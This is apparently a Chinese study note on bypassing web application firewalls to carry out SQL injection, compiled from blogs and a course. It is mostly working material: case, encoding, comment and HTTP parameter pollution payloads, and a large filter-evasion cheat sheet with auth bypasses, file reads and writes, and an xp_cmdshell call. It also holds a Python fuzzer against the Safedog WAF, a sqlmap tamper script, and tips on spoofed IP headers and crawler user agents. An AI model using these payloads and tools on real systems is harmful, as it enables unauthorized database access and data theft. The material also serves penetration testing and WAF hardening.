
<a name="RFgok"></a>
### 网络资源
[https://www.cnblogs.com/cute-puli/p/11146625.html](https://www.cnblogs.com/cute-puli/p/11146625.html)<br />[https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html](https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html)<br />[

](https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html)
<a name="7f94bcac"></a>
#### 0x0 前言

促使本文产生最初的动机是前些天在做测试时一些攻击向量被WAF挡掉了，而且遇到异常输入直接发生重定向。之前对WAF并不太了解，因此趁此机会科普一下并查阅了一些绕过WAF的方法。网上关于绕过WAF有诸多文章，但是观察之后会发现大体上绕过WAF的方法就那八、九种，而且这些技术出来也有些日子了，继续使用这些方法是否有效有待于我们在实际中去验证。看过数篇绕过WAF的文章后，前人对技术的总结已经比较全面，但是完整的内容可能分布在各处，查阅起来不太方便。另外，我们谈绕过WAF，其实就是谈如何绕过过滤机制，如果在讨论bypass技术的时候明确一下现有的一些filter的实现及其evasion，对于我这样的初学者来说是不是更好？还有就是如果在文章后面可以提供一些测试向量提供思路和参考，内容看起来很杂，但是也会比较方便呢?抱着这些想法，同时也顶着巨大的压力(前人工作已经比较完善，这么大的信息量总结起来对我是一次挑战)，我还是决定写出本文，这样更能适应自己的需求，也可能更加适合一些朋友的需求。

本文内容从技术上来说并非原创，也没有很新的或重大的发现，乃是这几天从各种资料信息中进行整理所得。本文会对形如http://www.site.com的URI进行简化，约定为z.com。

<a name="a153eae0"></a>
#### 0x1 WAF的常见特征

之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详细介绍，只谈及几点相关的。

总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：

\1. 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话

\2. 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式

\3. 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。

\4. WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。

WAF的常见特点：

异常检测协议：拒绝不符合HTTP标准的请求

增强的输入验证：代理和服务端的验证，而不只是限于客户端验证

白名单&黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题

基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活

状态管理：重点进行会话保护

另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等

如果是对于扫描器，WAF有其识别之道：

扫描器识别主要由以下几点：

1.  扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识 
2.  单IP+ cookie某时间段内触发规则次数 
3.  隐藏的链接标签等() 
4.  Cookie植入 
5.  验证码验证，扫描器无法自动填充验证码 
6.  单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404 

<a name="3cd38966"></a>
#### 0x2 绕过WAF的方法

从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧

a) 大小写混合

b)替换关键字

c)使用编码

d)使用注释

e)等价函数与命令

f)特殊符号

g)HTTP参数控制

h)缓冲区溢出

i)整合绕过

**a) 大小写绕过**

大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术

举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4

示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理

**b)替换关键字**

这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过

举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4

同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望

**c)使用编码**

1.URL编码

在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29

普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

2.十六进制编码

举例：z.com/index.php?page_id=-15 /_!u%6eion_/ /_!se%6cect_/ 1,2,3,4…

SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点

3.Unicode编码

Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了

看一下常用的几个符号的一些Unicode编码：

单引号:  %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7

空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0

左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8

右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

举例：?id=10%D6‘%20AND%201=2%23

SELECT 'Ä'='A'; #1

两个示例中，前者利用双字节绕过，比如对单引号转义操作变成'，那么就变成了%D6%5C'，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用

第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过

另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下

常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子

**d) 使用注释**

看一下常见的用于注释的符号有哪些：*//, -- , /**/, #, --+,--  -, ;，--a**

1.普通注释

举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4

'union%a0select pass from users#

/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、--+用于终结语句的查询

2.内联注释

相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别

举例：index.php?page_id=-15 /_!UNION_/ /_!SELECT_/ 1,2,3

?page_id=null%0A/**//_!50000%55nIOn_//_yoyu_/all/**/%0A/_!%53eLEct_/%0A/_nnaa_/+1,2,3,4…

两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用

**e)等价函数与命令**

有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用

1.函数或变量

hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@[@user ](/user ) ==> user() 

@[@datadir ](/datadir ) ==> datadir() 

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74

或者：substr((select 'password'),1,1) = 0x70

strcmp(left('password',1), 0x69) = 1

strcmp(left('password',1), 0x70) = 0

strcmp(left('password',1), 0x71) = -1

上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论

2.符号

and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>，因为如果不小于又不大于，那边是等于了

在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/

3.生僻函数

MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘ ’,’/script/@x/’,’src=//evil.com’);

?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))

SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql

?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制

**f) 特殊符号**

这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多

先看下乌云drops上“waf的绕过技巧”一文使用的几个例子：

1.使用反引号`，例如select`version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用

2.神奇的"-+."，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤

3.@符号，select@^1.from users; @用于变量定义如**@_var_name_**，一个@表示用户定义，@@表示系统变量

4.Mysql function() as xxx 也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制

可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到

本人搜罗了部分可能发挥大作用的字符(未包括'、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00

举例：

关键字拆分：‘se’+’lec’+’t’

%S%E%L%E%C%T 1

1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)

!和()：' or --+2=- -!!!'2

id=1+(UnI)(oN)+(SeL)(EcT)　//另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔

本节最后在给出一些和这些字符多少有点关系的操作符供参考：

>>, <<, >=, <=, <>,<=>,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN

使用这些"特殊符号"实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段

**g) HTTP参数控制**

这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制

1.HPP(HTTP Parameter Polution)

举例：/?id=1;select+1,2,3+from+users+where+id=1—

/?id=1;select+1&id=2,3+from+users+where+id=1—

/?id=1/**/union/_&id=_/select/_&id=_/pwd/_&id=_/from/_&id=_/users

HPP又称做重复参数污染，最简单的就是?uid=1&uid=2&uid=3，对于这种情况，不同的Web服务器处理方式如下：

![](https://images0.cnblogs.com/blog/536040/201402/251206222237074.jpg#id=DQj71&originHeight=178&originWidth=552&originalType=binary&ratio=1&status=done&style=none)

具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过

2.HPF(HTTP Parameter Fragment)

这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)

举例：

/?a=1+union/_&b=_/select+1,pass/_&c=_/from+users--

select _ from table where a=1 union/_ and b=_/select 1,pass/_ limit */from users—

看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。

3.HPC(HTTP Parameter Contamination)

这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染

RFC2396定义了如下一些字符：

Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()<br />Reserved : ; / ? : @ & = + $ ,<br />Unwise : { } | \ ^ [ ] `

不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：

![](https://images0.cnblogs.com/blog/536040/201402/251226089128413.jpg#id=eOk1r&originHeight=165&originWidth=444&originalType=binary&ratio=1&status=done&style=none)

以魔术字符%为例，Asp/Asp.net会受到影响

![](https://images0.cnblogs.com/blog/536040/201402/251227410156281.jpg#id=PGmkM&originHeight=125&originWidth=497&originalType=binary&ratio=1&status=done&style=none)

**h) 缓冲区溢出(Advanced)**

缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过

举例：

?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

示例0xA*1000指0xA后面”A"重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出

i) 整合绕过

整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。

举例：
```bash
z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…

id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -

?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--  
```
<a name="UcKpE"></a>
#### 0x3 SQLi Filter的实现及Evasion
SQL Injection时用得最多的一些关键字如下：and, or, union, where, limit, group by, select, ', hex, substr, white space<br />对它们的检测，完整正则表达式为：preg_match('/(and|or|union|where|limit|group by|select|'|hex|substr|\s)/i', $id)<br />其应对方式依次为：
```bash
***note***:"=>"左边表示会被Filtered的语句，"=>"右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字

and => && 　　or => ||

union select user, password from users　　 =>　　1 || (select user from users where user_id = 1) = 'admin

1 || (select user from users where user_id = 1) = 'admin'　　=>　　1 || (select user from users limit 1) = 'admin

1 || (select user from users limit 1) = 'admin' =>　　1 || (select user from users group by user_id having user_id = 1) = 'admin'
1 || (select user from users group by user_id having user_id = 1) = 'admin' =>　1 || (select substr(group_concat(user_id),1,1) user from users )=1
1 || (select substr(group_concat(user_id),1,1) user from users) = 1 =>	1 || 1 = 1 into outfile 'result.txt'　或者  1 || substr(user,1,1) = 'a'　
1 || (select substr(group_concat(user_id),1,1) user from users) = 1 　=>　　1 || user_id is not null 或者 1 || substr(user,1,1) = 0x61
　　　或者 1 || substr(user,1,1) = unhex(61)　　//　' Filtered
1 || substr(user,1,1) = unhex(61)　　=>	1 || substr(user,1,1) = lower(conv(11,10,36))
1 || substr(user,1,1) = lower(conv(11,10,36)) =>　　1 || lpad(user,7,1)
1 || lpad(user,7,1)　　=>　　1%0b||%0blpad(user,7,1)　　// ' ' Filtered
```
从上面给出的示例来看，没有绝对的过滤，即便平时构建一个正常SQL语句的全部关键字都被过滤了，我们也还是能找到Bypass的方法。普世的阳光和真理尚且照不到每一个角落，人为构建出来的一个工具WAF就更加不可能尽善尽美了。我们可以相信WAF能为我们抵挡很多攻击，但是绝不能百分之一百的依赖它，就算它有着世上最为健全的规则，它本身也是会存在缺陷的。<br />从前面到现在，基本上每条注入语句中都有数字，如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉，这就有点棘手了，不过办法总是有的：<br />![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627358949959-4cbf3867-913d-4001-a5cc-c8c18d30a767.png#clientId=ufe573d71-bd39-4&from=paste&id=u5372cd39&originHeight=451&originWidth=986&originalType=url&ratio=1&status=done&style=none&taskId=u5fd73f97-c2e1-4aa3-8958-43d16c0bd14)<br />![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627358971787-04fcfdac-c29c-4a39-b08a-ec112c1758f4.png#clientId=ufe573d71-bd39-4&from=paste&id=ufb30a04e&originHeight=520&originWidth=1009&originalType=url&ratio=1&status=done&style=none&taskId=u31df526d-ccc1-4de0-a4c6-116b6cc3d89)<br />上面两张图，第一张是不能使用数字时通过使用数学函数得到某个数字的值，第二章则是这些数字对应的36进制的值，因此有时候一个很简单的表达式可能会很复杂或者非常长，其实际就是计算mod(a,b)：
<a name="tskSw"></a>
#### 0x4 延伸及测试向量示例
a) CMS绕过实例<br />b) WAF绕过示例<br />c) SQLi Filter Evasion Cheat sheet<br />d) 测试向量<br /> 

1. e107 CMS

```
$inArray = array("'", ";", "/**/", "/UNION/", "/SELECT/", "AS "); 
if (strpos($_SERVER['PHP_SELF'], "trackback") === false) { 
foreach($inArray as $res) { 
if(stristr($_SERVER['QUERY_STRING'], $res)) { 
die("Access denied."); 
}}}

Bypass: vuln.php/trackback?inject=UNI%6fN SELECT
```

\2. PHP-Nuke CMS

```
if(isset($_SERVER['QUERY_STRING']) 
&& (!stripos($_SERVER['QUERY_STRING'], "ad_click"))) { 
$queryString = $_SERVER['QUERY_STRING']; 
if ( stripos($queryString, '%20union%20') 
OR stripos($queryString, '/*') 
OR stripos($queryString, '*/union/*') 
OR stripos($queryString, '+union+') 
OR stripos($queryString, 'concat')) { die('Illegal Operation'); }

Bypass: vuln.php?inject=%a0UNI%6fN(SELECT'ad_click'
```

\3. TYPO3 CMS

```
$val = str_replace(array("'"," ","("),"",$arrFields[$fname]); // basic defence
Bypass: vuln.php?id=1/**/union%a0select/**/1,pass,3`a`from`users`
```

b) WAF绕过示例

\1. ModSecurity CRS 2.0.9

```
1'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'1
1'union/*!select*/pass,load_file(0x123456789)from users-- -
```

\2. PHPIDS 0.6.4

```
foo'!=@a:=0x1 div'1a false != true 　　//auth bypass
　foo'div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'0

　a'in(true) and false */*!(true)union#newline select pass`alias`from users where true*/* n'1
```

\3. GreenSQL 1.3.0

检测关键字：union, information_schema, into outfile, current_user, current_date, version

检测函数：mid(), substring(), substr(), load_file(), benchmark(), user(), database(), version()

```
adm' 'in' or 1='1        // auth bypass

'-(1)union(select table_name,load_file('/tmp/test'),@@version

from /*! information_schema.tables */);%00    //select union

'-'' into%a0outfile '/tmp/test   //write to file
```

```
#注释
‘ or 1=1#
‘ or 1=1/* (MySQL < 5.1)
' or 1=1;%00
' or 1=1 union select 1,2 as `
' or#newline
' /*!50000or*/1='1
' /*!or*/1='1

#前缀
+ – ~ !
‘ or –+2=- -!!!’2

#操作符：
^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL

#空格
%20 %09 %0a %0b %0c %0d %a0 /**/
‘or+(1)sounds/**/like“1“–%a0-
‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#

#有引号的字符串
SELECT ‘a’
SELECT “a”
SELECT n’a’
SELECT b’1100001′
SELECT _binary’1100001′
SELECT x’61′

#没有引号的字符串
　‘abc’ = 0×616263
　　' and substr(data,1,1) = 'a'#　　' and substr(data,1,1) = 0x61	# 0x6162　　' and substr(data,1,1) = unhex(61)	# unhex(6162)　　' and substr(data,1,1) = char(97	)# char(97,98)　　' and substr(data,1,1) = 'a'#　　' and hex(substr(data,1,1)) = 61#　　' and ascii(substr(data,1,1)) = 97#　　' and ord(substr(data,1,1)) = 97# 　　' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
#别名
select pass as alias from users
select pass`alias alias`from users

#字型
‘ or true = ’1 # or 1=1
‘ or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
‘ or ’1 # or true
#操作符字型
select * from users where ‘a’='b’='c’
select * from users where (‘a’='b’)=’c’
select * from users where (false)=’c’

#认真绕过‘=’
select * from users where name = ”=”
select * from users where false = ”
select * from users where 0 = 0
select * from users where true#函数过滤器ascii (97)
load_file/*foo*/(0×616263)

#用函数构建字符串
‘abc’ = unhex(616263)
‘abc’ = char(97,98,99)
 hex(‘a’) = 61
 ascii(‘a’) = 97
 ord(‘a’) = 97
‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))

#特殊字符

　　aes_encrypt(1,12) // 4鏷眥"^z譎é蒃a　　des_encrypt(1,2) 						// 侴Ò/镏k　　@@ft_boolean_syntax 					// + -><()~*:""&|　　@@date_format 						// %Y-%m-%d　　@@innodb_log_group_home_dir 		// .\
@@new: 0
@@log_bin: 1
#提取子字符串substr(‘abc’,1,1) = ‘a’
substr(‘abc’ from 1 for 1) = ‘a’
substring(‘abc’,1,1) = ‘a’
substring(‘abc’ from 1 for 1) = ‘a’
mid(‘abc’,1,1) = ‘a’
mid(‘abc’ from 1 for 1) = ‘a’
lpad(‘abc’,1,space(1)) = ‘a’
rpad(‘abc’,1,space(1)) = ‘a’
left(‘abc’,1) = ‘a’
reverse(right(reverse(‘abc’),1)) = ‘a’
insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’
space(0) = trim(version()from(version()))

#搜索子字符串
locate(‘a’,'abc’)
position(‘a’,'abc’)
position(‘a’ IN ‘abc’)
instr(‘abc’,'a’)
substring_index(‘ab’,'b’,1)

#分割字符串
length(trim(leading ‘a’ FROM ‘abc’))
length(replace(‘abc’, ‘a’, ”))

#比较字符串
strcmp(‘a’,'a’)
mod(‘a’,'a’)
find_in_set(‘a’,'a’)
field(‘a’,'a’)
count(concat(‘a’,'a’))

#字符串长度
length()
bit_length()
char_length()
octet_length()
bit_count()

#关键字过滤
Connected keyword filtering
(0)union(select(table_name),column_name,…
0/**/union/*!50000select*/table_name`foo`/**/…
0%a0union%a0select%09group_concat(table_name)….
0′union all select all`table_name`foo from`information_schema`. `tables`

#控制流
case ‘a’ when ‘a’ then 1 [else 0] end
case when ‘a’='a’ then 1 [else 0] end
if(‘a’='a’,1,0)
ifnull(nullif(‘a’,'a’),1)
```

<a name="wOaYo"></a>
### 小迪课程
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625389326994-0be8a5eb-af50-4eb1-a2ef-dc29452d2839.png#from=url&id=htdrB&originHeight=778&originWidth=827&originalType=binary&ratio=1&status=done&style=none)

---

<a name="QCEa1"></a>
#### 案例演示

- 简要其他绕过方式学习
- FUZZ绕过脚本结合编写测试
- 阿里云盾防SQL注入简要分析
- 安全狗+云盾SQL注入插件脚本编写
```bash
%23x%20union%23x%0Aselect%201,2,3

%20union%20/*!44509select*/%201,2,3

%20/*!44509union*/%23x%0aselect%201,1,2,3

id=1/**&id=-1%20union%20select%201,2,3%23*/

%20union%20all%23%0a%20select%201,2,3%23
```
**方式一:IP白名单**<br />从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造Ip绕过的情况。<br />测试方法:修改nttp的header来bypass waf
```bash
x-forwarded-for
x-remote-IP
x-originating-工P
x-remote-addr
x-Real-ip
```
**方式二:静态资源**<br />特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了检测效率，不去检测这样一些静态文件名后缀的请求。
```bash
http://10.s.9.201/sql.php ?id=1
http://10.9.9.201/sql.php/1.j=?id=1
```
备注: aapx/php只识别到前面的.aspx/ .php后面基本不识别

**方式三:url白名单**<br />为了防止误拦，部分waf内置默认的白名单列表，如acmin/managerl system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的uzl构造姿势:
```bash
http://10.s.s.201/=ql.php/admin.php?id=1
http://10.9.9.201/sql.php?a=/manage/&b=../etc/passwd
http://10.9.s.201/../../../manage/../sql.asp?id=2
```
waf通过/manage/"进行比较，只要uri中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?a=/ manage/&b=../etc/passwcl绕过防御规则。

<a name="Y8tZt"></a>
#### fuzz代码实现
```bash
import requests, time

url = 'http://10.1.1.120/Less-2/?id=1'
union = 'union'
select = 'select'
num = '1,2,3'
a = {'%0a', '%23'}
aa = {'x'}
aaa = {'%0a', '%23'}
b = '/*!'
c = '/*'


def bypass():
    for xiaodi in a:
        for xiaodis in aa:
            for xiaodiss in aaa:
                for two in range(44500, 44600):
                    urls = url + xiaodi + xiaodis + xiaodiss + b + str(two) + union + c + xiaodi + xiaodis + xiaodiss + select + xiaodi + xiaodis + xiaodiss + num
                    try:
                        result = requests.get(urls).text
                        len_r = len(result)
                        if (result.find('safedog') == -1):
                            # print('bypass url address:'+ urls+'|'+ str(len_r))
                            print('bypass url address:' + urls + '|' + str(len_r))
                            if len_r == 715:
                                fp = open('url,txt', 'a+')
                                fp.write(urls + '\n')
                                fp.close()
                    except Exception as err:
                        print('connecting error')
                        time.sleep(0.1)


if __name__ == '__main__':
    print('fuzz start')
    bypass()

```
运行结果<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627372390965-94e7bfb4-f66d-4232-b401-f9d6865536ef.png#clientId=ufe573d71-bd39-4&from=paste&id=u07e6c1a9&originHeight=566&originWidth=1025&originalType=binary&ratio=1&size=199477&status=done&style=none&taskId=u72f3ae58-f1c4-4f65-8a02-1f31c648adf)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627372430678-1f67d0bc-0484-42da-b5d0-0c99184137d3.png#clientId=ufe573d71-bd39-4&from=paste&height=207&id=u8dadf3e2&originHeight=414&originWidth=1920&originalType=binary&ratio=1&size=369279&status=done&style=none&taskId=u703ba153-9dba-45c8-8ae3-ddd6a5227bc&width=960)
<a name="oSbOq"></a>
#### SQLmap tamper
参考资料;[https://www.cnblogs.com/mark0/p/12349551.html](https://www.cnblogs.com/mark0/p/12349551.html)

在tamper文件夹中创建rdog.py
```bash
#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = retVal.replace('UNION', 'uNiOn/*/%0a*a*/')
        retVal = retVal.replace('DATABASE()', 'dataBase/*!(*/)')
        retVal = retVal.replace('DATABASE()', 'dataBase%23a%0a')
        retVal = retVal.replace('USER()', 'usEr/*!(*/)')
        retVal = retVal.replace(' ', '/**/')
        retVal = retVal.replace(" ", '%23a%0a')
        retVal = retVal.replace('OR', '/*!14400Or*/')
        retVal = retVal.replace('AND', '/*!14400aNd*/')

    return retVal
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627374935616-b86b20d3-b3b1-4d47-b2d2-76c554cfce12.png#clientId=ufe573d71-bd39-4&from=paste&height=417&id=u1b37e5ae&originHeight=833&originWidth=1863&originalType=binary&ratio=1&size=201888&status=done&style=none&taskId=u54fef176-6328-4dfb-b74a-42a9f1879b7&width=931.5)<br />可以看到的是代码并没有按照我们预期执行，我们添加代理看看到底是个什么情况<br />`python sqlmap.py -u "[http://10.1.1.120/Less-2/?id=1"](http://10.1.1.120/Less-2/?id=1") --tamper=rdog.py --proxy=[http://10.1.1.2:8888](http://10.1.1.2:8888)`启动burp<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375128795-9bede960-696c-4118-97ce-80532c43cc52.png#clientId=ufe573d71-bd39-4&from=paste&height=173&id=u91209ee4&originHeight=346&originWidth=1896&originalType=binary&ratio=1&size=36659&status=done&style=none&taskId=u786ea120-e58e-4039-89e1-e7bf463f314&width=948)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375175612-3500c7bc-2c69-4e4e-8bd3-e5db48176519.png#clientId=ufe573d71-bd39-4&from=paste&height=156&id=u582fbaa6&originHeight=312&originWidth=1508&originalType=binary&ratio=1&size=37723&status=done&style=none&taskId=u9c427a01-aad6-408f-a032-ef9b7830abe&width=754)<br />可以看到user-agent是`sqlmap/1.5.6.4#dev ([http://sqlmap.org)](http://sqlmap.org))`，安全软件当中是禁止使用这种脚本客户端所以就被拦截，自然插件脚本也就没办法正常执行<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375768604-e010fce0-c100-43c5-b936-d39f4125f10a.png#clientId=ufe573d71-bd39-4&from=paste&height=130&id=u038148c2&originHeight=260&originWidth=1881&originalType=binary&ratio=1&size=41646&status=done&style=none&taskId=u297b4dd0-23e4-4b9d-9d16-989e4c9d8c1&width=940.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627375791211-09d3e84a-94c9-484e-8f33-6ebb2cf88fd1.png#clientId=ufe573d71-bd39-4&from=paste&height=282&id=u09e35d7b&originHeight=563&originWidth=1832&originalType=binary&ratio=1&size=109131&status=done&style=none&taskId=u5253e91b-dc87-4eca-8b67-fb8604dad02&width=916)<br />最终找到漏洞

备注：在真实环境当中waf可能会配置流量访问也就是说你访问的速度过快会将你访问的ip拉入黑名单，对此我们使用的策略是`延时，代理，爬虫白名单`<br />搜索引擎爬虫user-agent信息：[https://blog.csdn.net/liuxl57805678/article/details/89378720](https://blog.csdn.net/liuxl57805678/article/details/89378720)

**自定义user-agent**
```bash
python sqlmap.py -u "http://10.1.1.120/Less-2/?id=1"  --tamper=rdog.py --proxy=http://10.1.1.2:8888 --user-agent="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627377869786-598d2ceb-dcbc-482e-b4a6-97e8d6a99e24.png#clientId=ufe573d71-bd39-4&from=paste&height=251&id=u69c9d102&originHeight=501&originWidth=1606&originalType=binary&ratio=1&size=77366&status=done&style=none&taskId=u1a6b865d-013d-46c9-97f7-b7cd866cf48&width=803)

**延时注入**<br />--delay 时间（默认为秒）
```bash
C:\Users\admin\Desktop\security\software\sqlmapproject-sqlmap-7c41967>python sqlmap.py -u "http://10.1.1.120/Less-2/?id=1"  --tamper=rdog.py --proxy=http://10.1.1.2:8888 --delay 1
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.6.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

